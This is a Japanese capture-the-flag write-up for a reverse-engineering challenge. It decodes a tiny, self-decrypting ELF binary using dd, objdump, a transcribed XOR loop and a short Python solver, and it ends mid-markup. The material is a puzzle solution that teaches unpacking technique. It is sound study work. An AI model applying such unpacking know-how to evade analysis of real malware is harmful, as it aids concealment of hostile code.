    style="padding-bottom: 20.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA40lEQVQY012N206DUBBF0aitGm3ii30okUspGBBILLdSpEA5jWnF+NL4/z+yPKVp0viwMrNn9p5RMjthkwlE2iLCCuEJSruhmK6onLXs1+TmikRdkBsfcl6xtGoap+E7aGn0lHIyp9FS8ucAZWsVdG7NRl/QahnCzPicLWmlURgZxThg/jDriR5topFNPHJ4lzq8m+Jev/A20PFuNPyBgfIbb+nkp9PSuZjweqn21b06mA38oYl/ax7r0DgidSAJ760+e0L58Wr26Rf7ZMfOrai1hEqN6JyS+Mntw+eB//RHz/QfEud4BSOE9uQAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/200ead58abbb7c9037b931df927eb867/8ac56/image-20240225172815610.webp 240w,
/static/200ead58abbb7c9037b931df927eb867/d3be9/image-20240225172815610.webp 480w,
/static/200ead58abbb7c9037b931df927eb867/99a1d/image-20240225172815610.webp 801w"
              sizes="(max-width: 801px) 100vw, 801px"
              type="image/webp"
            />
          <source
            srcset="/static/200ead58abbb7c9037b931df927eb867/8ff5a/image-20240225172815610.png 240w,
/static/200ead58abbb7c9037b931df927eb867/e85cb/image-20240225172815610.png 480w,
/static/200ead58abbb7c9037b931df927eb867/2ad15/image-20240225172815610.png 801w"
            sizes="(max-width: 801px) 100vw, 801px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/200ead58abbb7c9037b931df927eb867/2ad15/image-20240225172815610.png"
            alt="image-20240225172815610"
            title="image-20240225172815610"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="binary-shrinkrev" style="position:relative;"><a href="#binary-shrinkrev" aria-label="binary shrinkrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Binary shrink(Rev)</h2>
<blockquote>
<p>After hearing about young computer problems, you have decided to become a computer shrink. Your first patient is a robot elf.</p>
<p>“A little machine dream I keep having, ” she says. “But when it is over, I always forget the end. I’ve captured the dream’s program, but I don’t dare look”.</p>
<p>Can you run the program for her? Are you able to figure out what’s in her memory right before execution stops?</p>
</blockquote>
<p>問題バイナリとして与えられた ELF ファイルを実行すると、<code class="language-text">>:)</code> という文字列が出力されるのみでした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 930px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/63ba31d54f9a1a85edf0aa969df7df43/416ee/image-20240225173104444.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 9.583333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAhklEQVQI1y2LSw6CMABEuYEKrCSCGk0kxgKtfKRagr+FxrDS+9/kWdDFy5vMZBwjDT31sqCeNxwWPQa9atHrC2V4tFtDFZ3Qti+tH7s7nbjyqV68iyddcsMEijYscPJZigoEyt8i3YTMs1hLL0X6GdlE2PzvXDFYT3/nc1QO7EexZUM+jvkCBUw+VFukensAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/63ba31d54f9a1a85edf0aa969df7df43/8ac56/image-20240225173104444.webp 240w,
/static/63ba31d54f9a1a85edf0aa969df7df43/d3be9/image-20240225173104444.webp 480w,
/static/63ba31d54f9a1a85edf0aa969df7df43/6eb96/image-20240225173104444.webp 930w"
              sizes="(max-width: 930px) 100vw, 930px"
              type="image/webp"
            />
          <source
            srcset="/static/63ba31d54f9a1a85edf0aa969df7df43/8ff5a/image-20240225173104444.png 240w,
/static/63ba31d54f9a1a85edf0aa969df7df43/e85cb/image-20240225173104444.png 480w,
/static/63ba31d54f9a1a85edf0aa969df7df43/416ee/image-20240225173104444.png 930w"
            sizes="(max-width: 930px) 100vw, 930px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/63ba31d54f9a1a85edf0aa969df7df43/416ee/image-20240225173104444.png"
            alt="image-20240225173104444"
            title="image-20240225173104444"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>問題文を読むと、プログラム実行中のメモリに Flag が書き込まれるようです。</p>
<p>こんなの gdb で余裕、、、かと思いきや、前問と同じく Tiny ELF のテクニックを使用しており、gdb ではうまく解析ができませんでした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 837px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/7aaccd16670fa2c540287d57d820e6b8/ddc81/image-20240225173321665.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 38.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrklEQVQoz22R21PaQBSHeWnH1qkdrW2nTKsoULwAiQJJkCQQknBRAYEEFVQu04t96P//+HV37Uyn0z58c3ZPZr/9nU2i63RxNJtG3sZNu9QPQuyMh3cY4uQCnM8+/nEbR/TKSQtzp0ZhU8dMmrQyNcK05IxuzqX6tkji52BFdNpl4U0EMV/CG+aNiK+dKctmLHoR3zozVsGEft7D/aBTfZPH2jqi/PqQwvMUecmzFMW1fRLfL+eMSh3mzQkPjVgxc0cs/GtRx2otv93XI5HIVincj2WcZImzdxon61n0lxn09YyqiR+9BeNSV4giHkTCZSAS/q5SclcfsxKpV+EtrayN9iKtkpU3Dii9yqm9REmVsL9kdNphag+VQIqvrR53Il1cuVDre9F7SlgTqYoEe1X8PYvmrqkk/xXKgxIplokn5qXiptonNi6IKudc6S110UALqb3XBLoYNfu38LE3Z1AMGJel5EkoxTNnqNZSqN5T7NtZh37Bx9s18FOW4p+RH8UbDk/aTGtX6rBMFexX1TiSxqcK3o5BM2VibRew5B/ezmNsHWNsHqGt/ZFJfgGaQw6rlyh+6QAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/7aaccd16670fa2c540287d57d820e6b8/8ac56/image-20240225173321665.webp 240w,
/static/7aaccd16670fa2c540287d57d820e6b8/d3be9/image-20240225173321665.webp 480w,
/static/7aaccd16670fa2c540287d57d820e6b8/a6125/image-20240225173321665.webp 837w"
              sizes="(max-width: 837px) 100vw, 837px"
              type="image/webp"
            />
          <source
            srcset="/static/7aaccd16670fa2c540287d57d820e6b8/8ff5a/image-20240225173321665.png 240w,
/static/7aaccd16670fa2c540287d57d820e6b8/e85cb/image-20240225173321665.png 480w,
/static/7aaccd16670fa2c540287d57d820e6b8/ddc81/image-20240225173321665.png 837w"
            sizes="(max-width: 837px) 100vw, 837px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/7aaccd16670fa2c540287d57d820e6b8/ddc81/image-20240225173321665.png"
            alt="image-20240225173321665"
            title="image-20240225173321665"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>エントリポイントは 0x8048009 になっています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/bbe061122be11488a66d9438bc57270c/b6e34/image-20240225173630827.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 65.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQElEQVQ4y3VTZ1PbUBDUTBIcYgIBMsQQinuTZFmSe5Uty5Z7XGBIQj7k//+Izd0Ze2IGPty8ond3e7srxdPa6BsOqtcmKiEb5VBBonFXQ/WqiOKFSWcb1lkO9qmK+rc8yucaahcG6qE8rKMkjMMY8p/iEspU7WKYaMIIRFE4TklYRwk06fHK9jFVO2hfWWhdmmhQMU7OBSLQn2NbbLsqY0pYWAPYx2loBxG55IeMYphuY5x10KSCpdMsrM8pmMHEDs029hBywo98H8UvGUnijzoVbhCih/IEg0QDbqQiweO+HPFlKCNCsS6MMNVcLMw+etGqIGSOfjcX6Mfrclc6U5H7GH0V1V7BQbKJWa6HCY0+Nzy0rwvEURSVrzqWlo/uXZnQ87jJN1HtFRw+I3yszvCnvZK99iGMMiFiKqQBIWMauNFWDDnTPSP9PxROui+NsS6OsCRVH2tzEsnHTO+JWK3vNrrhsqxc3LkpSnRuS0JLhcSr0jS8t0k0xbdcuHkHnu7ATXbg53xM7AncTA9etoe+6mFoDNHLuJhbm0m48U9qzE1b5IAGWYybFU7SNHKqJUr6tDKPowxZJeOIGIyieWnJ40bIpL0pZ7YRI2ZaCicbd/CeHaBMta74bWkPhTNOYCE4iYVhP2oHYWTf3SD7/lb2Wx6Zw10ENnwqjMQNV+jPMAURc6JTEo/hkV3MYFzM7MVqgpR/gNfMvVOZDVw6V6EHYyLIk3OPZWmKFan91/uFh+pc7MTnJ2ct4nHRt3z4D78HjGEgPjyvAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/bbe061122be11488a66d9438bc57270c/8ac56/image-20240225173630827.webp 240w,
/static/bbe061122be11488a66d9438bc57270c/d3be9/image-20240225173630827.webp 480w,
/static/bbe061122be11488a66d9438bc57270c/e46b2/image-20240225173630827.webp 960w,
/static/bbe061122be11488a66d9438bc57270c/33ecb/image-20240225173630827.webp 1103w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/bbe061122be11488a66d9438bc57270c/8ff5a/image-20240225173630827.png 240w,
/static/bbe061122be11488a66d9438bc57270c/e85cb/image-20240225173630827.png 480w,
/static/bbe061122be11488a66d9438bc57270c/d9199/image-20240225173630827.png 960w,
/static/bbe061122be11488a66d9438bc57270c/b6e34/image-20240225173630827.png 1103w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/bbe061122be11488a66d9438bc57270c/d9199/image-20240225173630827.png"
            alt="image-20240225173630827"
            title="image-20240225173630827"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このままだとデコンパイラでも objdump でも正しいコードを取得できないので、<code class="language-text">dd if=binary_shrink of=outdata bs=1 skip=9</code> で先頭部分をカットした上で <code class="language-text">objdump -D -Mintel,x86-64 -b binary -m i386 outdata</code> によりアセンブリを取得します。</p>
<p>とりあえず元ファイルのオフセット 58(0x31+9) のアドレスをコールするところから始まっているようですが、その後の処理は上手くディスアセンブルされていないようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/0c971463728c232bff6464b0cbfb5c3c/187fa/image-20240225180035936.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 29.583333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABCUlEQVQY042QX1OCQBTFedJ01NIaS5tqACWUhV1QCAQy8U/iaL000/f/JKe7S8/lw2/u3Xt3zz13tcSYI7h3EQ0ForsQ0SCE6AmwjgNXwcDaU8yuPRSPEdJbgXwY4O0hpJwjG/iqtqLeos+hZX2BpMfw0nWQyQuE3zTB6zr4hQHRqJC5W9Ph1SlST+JRzav/1mrVWSsnS+zGKbbmQk2bdWwE7WeEVxPML22I5gh+a6ziOWjS9sFeYm/lJGSpiRsjQUm1r/CAT77F6ilSjuQD3jD/Foy6UxxZgXcSVCsQu1GKD2+jBL/jk/qfoGWd5zCnNUv7FUenqByS4FqPK1G3Ej2xNeIb9193kh8ARK8c34W6pgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/0c971463728c232bff6464b0cbfb5c3c/8ac56/image-20240225180035936.webp 240w,
/static/0c971463728c232bff6464b0cbfb5c3c/d3be9/image-20240225180035936.webp 480w,
/static/0c971463728c232bff6464b0cbfb5c3c/e46b2/image-20240225180035936.webp 960w,
/static/0c971463728c232bff6464b0cbfb5c3c/de1dc/image-20240225180035936.webp 1194w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/0c971463728c232bff6464b0cbfb5c3c/8ff5a/image-20240225180035936.png 240w,
/static/0c971463728c232bff6464b0cbfb5c3c/e85cb/image-20240225180035936.png 480w,
/static/0c971463728c232bff6464b0cbfb5c3c/d9199/image-20240225180035936.png 960w,
/static/0c971463728c232bff6464b0cbfb5c3c/187fa/image-20240225180035936.png 1194w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/0c971463728c232bff6464b0cbfb5c3c/d9199/image-20240225180035936.png"
            alt="image-20240225180035936"
            title="image-20240225180035936"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>そこで次は、<code class="language-text">dd if=binary_shrink of=outdata bs=1 skip=58</code> コマンドで 58(0x31+9) バイト目からのデータを取得して解析します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/d4c7db6e7274fb38370d08b06c539867/7798c/image-20240225180121067.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 24.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY042PS1PCMBCAe1IU8YHjo1XUClSxrzTSFG0LBR3R0WE8ePDi//8Zn010HI89fLNJdvfbjXXfT0lOAlJboGxF5ijEfkKwHRD+EnR8ZDdifqaYOreUjqTqpeRHgtnp2ER9r3pjrPwgRu2MmHR9ymNBfhgj2wPilotoXSI2+oa4PofrriH6iz9v0b+c9erPWXqlmaD2bkh3R8iOh9zySNpDYi3T0s1BI6yi3urNXxhhuHZhpi3OM56vpiyHhRFrdHETsZXVX30XTxR2YlbWTQ/uhJfrGV/VB593K1bhY2PhN9FCkFh13em+AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/d4c7db6e7274fb38370d08b06c539867/8ac56/image-20240225180121067.webp 240w,
/static/d4c7db6e7274fb38370d08b06c539867/d3be9/image-20240225180121067.webp 480w,
/static/d4c7db6e7274fb38370d08b06c539867/e46b2/image-20240225180121067.webp 960w,
/static/d4c7db6e7274fb38370d08b06c539867/62502/image-20240225180121067.webp 1183w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/d4c7db6e7274fb38370d08b06c539867/8ff5a/image-20240225180121067.png 240w,
/static/d4c7db6e7274fb38370d08b06c539867/e85cb/image-20240225180121067.png 480w,
/static/d4c7db6e7274fb38370d08b06c539867/d9199/image-20240225180121067.png 960w,
/static/d4c7db6e7274fb38370d08b06c539867/7798c/image-20240225180121067.png 1183w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/d4c7db6e7274fb38370d08b06c539867/d9199/image-20240225180121067.png"
            alt="image-20240225180121067"
            title="image-20240225180121067"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>恐らくスタックトップに入っているエントリポイントの次の実行アドレスを rdx に pop した後、rax に rdx を格納し、その後 0x78(0x3e+58) のアドレスに jmpしているようです。</p>
<p>同じ要領で、<code class="language-text">dd if=binary_shrink of=outdata bs=1 skip=120</code> で抜き出した次のコードをディスアセンブルします。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/1c3bab040f9b1ddb479e20556250f684/60b3a/image-20240225180248116.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLklEQVQoz42RW0/CQBCF+yQXBTQoIGqwBQTDbrftttALdxCCt5gY//9POc4uNoQX6cPJSXe335yZMQLThdtkGDYkZCOArEnwSxuswsHKjJxhUBrAqwqsHkPM7iSmpEVriHHDxfwhwOSW/N7X90Z4RY/Pu4ivOZKajfiGwy224eQtOIWDBH3zMxM8d5Cds45c3Ruf9hov7VhXGlOlkMB2noDFDlwqpFyQnIwyFOxb7rA2IyR1gYgSrswQm06C98GCkrUhCvsCqf8LVH1/sCVkqadjuxddrK1oD6RzBUmVBWpsu2OdMKk71KqlwSrtrjfFT/AGPRIrPoKeBH45G0yanv7BKz1hSalfn+dYtkaIa4K26Ol5ZgbOaOWq3fRQjUC1Paoy+OU+/Er/L+HppfwCZV3nOAjzYI4AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/1c3bab040f9b1ddb479e20556250f684/8ac56/image-20240225180248116.webp 240w,
/static/1c3bab040f9b1ddb479e20556250f684/d3be9/image-20240225180248116.webp 480w,
/static/1c3bab040f9b1ddb479e20556250f684/e46b2/image-20240225180248116.webp 960w,
/static/1c3bab040f9b1ddb479e20556250f684/58f5f/image-20240225180248116.webp 1179w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/1c3bab040f9b1ddb479e20556250f684/8ff5a/image-20240225180248116.png 240w,
/static/1c3bab040f9b1ddb479e20556250f684/e85cb/image-20240225180248116.png 480w,
/static/1c3bab040f9b1ddb479e20556250f684/d9199/image-20240225180248116.png 960w,
/static/1c3bab040f9b1ddb479e20556250f684/60b3a/image-20240225180248116.png 1179w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/1c3bab040f9b1ddb479e20556250f684/d9199/image-20240225180248116.png"
            alt="image-20240225180248116"
            title="image-20240225180248116"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>いくつかの処理を行った後に XOR の演算をループしているようです。</p>
<p>実際にビルドできるコードではないですが、ここまでの一連のコードを書き起こしてみました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">section <span class="token punctuation">.</span>text
global _start

first<span class="token operator">:</span>
    pop    rdx
    mov    rax<span class="token punctuation">,</span>rdx
    jmp    second

second<span class="token operator">:</span>
    add    rdx<span class="token punctuation">,</span><span class="token number">0x91</span>
    sub    rax<span class="token punctuation">,</span><span class="token number">0xe</span>
    mov    rsi<span class="token punctuation">,</span>rax
    xor    ecx<span class="token punctuation">,</span>ecx
    mov    cl<span class="token punctuation">,</span><span class="token number">0x56</span>
    mov    rax<span class="token punctuation">,</span>rsi
point<span class="token operator">:</span>
    mov    sil<span class="token punctuation">,</span>BYTE PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>
    xor    BYTE PTR <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span>sil
    xor    QWORD PTR <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x42</span>
    inc    rdx
    inc    rax
    loop   point

_start<span class="token operator">:</span>
    call first</code></pre></div>
<p>rax と rdx にはスタックトップに存在していたエントリポイントの次の命令アドレスが格納されているはずです。</p>
<p>そのため、<code class="language-text">sub    rax,0xe</code> にて rax にイメージベースのアドレスが格納され、<code class="language-text">add    rdx,0x91</code> では rdx に <code class="language-text">イメージベース + 0xe + 0x91</code> のアドレスが格納されそうです。</p>
<p>ループ区間では、rax と rdをインクリメントしながら、rax のアドレスの値を 0x42 で XOR して rdx のアドレスに書き込む処理を 0x56 回行うようです。</p>
<p>実際にこのようなバイナリ操作を行う以下の Solver を作成しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"binary_shrink"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

rax <span class="token operator">=</span> <span class="token number">0</span>
rdx <span class="token operator">=</span> <span class="token number">0xe</span> <span class="token operator">+</span> <span class="token number">0x91</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"generated_binary"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x56</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">^</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        data<span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>rdx<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x42</span>
        rdx <span class="token operator">+=</span> <span class="token number">1</span>
    
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre></div>
<p>ここで出力したバイナリの命令を読むと、bad data だった箇所が jmp 命令に置き換えられています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/1aae7e15040d7e10e72af716a6774346/04784/image-20240225192344388.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABFklEQVQoz42RW0/CQBCF90UtCogxKEU0toVq6G3bbqm9RTAIBjHxwfj//8lxZzQ8mj6czOztzDezorQU0kkIZYbIxwtWOkzg9zwEfZKv8znkwMfyNkNjJqiuJecUazPWMcLzRGF1l0EsbxSaUYynCw+1PmhGEml3hvDEYkWGDdlxEHVsBHod8L59iHzP+Ds7tiA20wpbt8HbQ/NLME6w0ObZYI6KzPuP2syBPJ22ksgvfaztAp9yg2IY8GPCJ3PaS3ouV6bLEZP+by7KqwivTokP/4XR/aP7g+GX2nFORdtSilrPj9r+zveaMGRDapuKEOG7t8JeS53r1g2nneHaKrCd1Yi7Lg+Xfo7mSpS0js9mkFptKH8AWabKo+vRX5YAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/1aae7e15040d7e10e72af716a6774346/8ac56/image-20240225192344388.webp 240w,
/static/1aae7e15040d7e10e72af716a6774346/d3be9/image-20240225192344388.webp 480w,
/static/1aae7e15040d7e10e72af716a6774346/e46b2/image-20240225192344388.webp 960w,
/static/1aae7e15040d7e10e72af716a6774346/963af/image-20240225192344388.webp 1174w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/1aae7e15040d7e10e72af716a6774346/8ff5a/image-20240225192344388.png 240w,
/static/1aae7e15040d7e10e72af716a6774346/e85cb/image-20240225192344388.png 480w,
/static/1aae7e15040d7e10e72af716a6774346/d9199/image-20240225192344388.png 960w,
/static/1aae7e15040d7e10e72af716a6774346/04784/image-20240225192344388.png 1174w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/1aae7e15040d7e10e72af716a6774346/d9199/image-20240225192344388.png"
            alt="image-20240225192344388"
            title="image-20240225192344388"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>jmp 先のコードを読むと、0xa293a3e つまり <code class="language-text">):>\n</code> を出力するコードでした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/a2e83298ce2722d6c58238d1fbc90347/712f7/image-20240225192657626.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABL0lEQVQoz5VR207CQBTsi6AoFCUB6yVQbIHC0u1l23IrEKgWiTGa+P+/Mu5ZlciL4MNkz57szpyZo4VND4HBEBsRIiOGaAgw3QWrMIWhzjAoDxDWODJzhNQIsLgTWDUTzK49LO8j2fOxuBVYt0bQkmof4UUH07qLWYNjXGPwTtsKXMHc1cOCCbcoz6K5V//uaS9shSdrKtV8xFcDCN0BL1nwpQghKHclOuBnFrzSYWhEtnWWEJWe/PSAqOoogU13jjf+qKyN5NQuTX0MIWXwOswwqXMkcsL4so9NJ0XWnmAtM6Me2aHHJEj4k3DVSvAhtsoeK7TUhFl7jNyeqcDZSRP+uX2QaEdIm3n3869P0pbQe3juzZVt2hwFfgzRHmFup+pCOf1kmN4ECL9z/Q/hJyLs5Xy/cDM3AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/a2e83298ce2722d6c58238d1fbc90347/8ac56/image-20240225192657626.webp 240w,
/static/a2e83298ce2722d6c58238d1fbc90347/d3be9/image-20240225192657626.webp 480w,
/static/a2e83298ce2722d6c58238d1fbc90347/e46b2/image-20240225192657626.webp 960w,
/static/a2e83298ce2722d6c58238d1fbc90347/a110d/image-20240225192657626.webp 1181w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/a2e83298ce2722d6c58238d1fbc90347/8ff5a/image-20240225192657626.png 240w,
/static/a2e83298ce2722d6c58238d1fbc90347/e85cb/image-20240225192657626.png 480w,
/static/a2e83298ce2722d6c58238d1fbc90347/d9199/image-20240225192657626.png 960w,
/static/a2e83298ce2722d6c58238d1fbc90347/712f7/image-20240225192657626.png 1181w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/a2e83298ce2722d6c58238d1fbc90347/d9199/image-20240225192657626.png"
            alt="image-20240225192657626"
            title="image-20240225192657626"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このコードが実行されているタイミングのメモリ情報は、復号されたバイナリをプロセスメモリに展開した状態と一致するので、このバイナリデータから Flag を取得できました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
